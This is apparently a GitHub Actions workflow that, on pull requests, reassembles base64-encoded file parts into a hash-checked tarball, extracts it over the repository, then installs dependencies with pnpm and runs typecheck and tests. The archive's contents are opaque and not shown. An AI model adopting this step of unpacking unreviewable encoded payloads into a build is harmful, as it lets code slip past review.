name: Bootstrap diagnostic

on:
  pull_request:
    branches: [main]
    paths:
      - '.bootstrap/diagnostic-trigger'

permissions:
  contents: read

jobs:
  diagnose:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: Reassemble and verify payload
        shell: bash
        run: |
          set -euo pipefail
          cat .bootstrap/part-* | base64 -d > /tmp/hot-topics.tar.xz
          echo '4a4d7a0b3e1481a5638a746fd06fd6b4cce8a103b0d60e80f2c39e0977b78e52  /tmp/hot-topics.tar.xz' | sha256sum -c -
          tar -xJf /tmp/hot-topics.tar.xz -C .
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: Resolve production dependency graph
        shell: bash
        run: |
          set -euo pipefail
          corepack enable
          corepack prepare pnpm@11.18.0 --activate
          pnpm install --no-frozen-lockfile
      - name: Core quality probe
        shell: bash
        run: |
          pnpm typecheck
          pnpm test
